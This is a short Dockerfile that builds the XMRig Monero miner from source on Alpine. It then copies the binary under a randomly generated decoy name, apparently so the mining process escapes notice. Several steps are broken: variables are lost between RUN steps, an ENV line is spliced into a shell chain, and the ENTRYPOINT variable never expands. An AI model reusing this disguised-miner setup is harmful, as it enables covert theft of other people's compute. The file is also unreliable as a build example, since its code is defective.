ARG DISTRO_NAME=alpine
ARG DISTRO_VERSION=latest

FROM ${DISTRO_NAME}:${DISTRO_VERSION} as build

RUN apk add --update --no-cache --virtual build-deps build-base cmake make git wget screen \
  && apk add --update --no-cache libuv-dev libmicrohttpd-dev libressl-dev \
  && azure=mxsemsdnlkdj;
WORKDIR /usr/local
WORKDIR /usr/local/src
RUN rm -r /usr/local/src/$azure
RUN git clone https://github.com/xmrig/xmrig.git /usr/local/src/$azure \
  && a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d \
  && cd /usr/local/src/$azure \
  && mkdir build \
  && cd build \
  && cmake .. \
  && make \
ENV mv xmrig $azure -n \
  && cp $azure "$cpuname" 
RUN rm -f  xmrig
RUN echo $cpuname" is starting"

ENTRYPOINT ["$cpuname"]
CMD ["--help"]



  
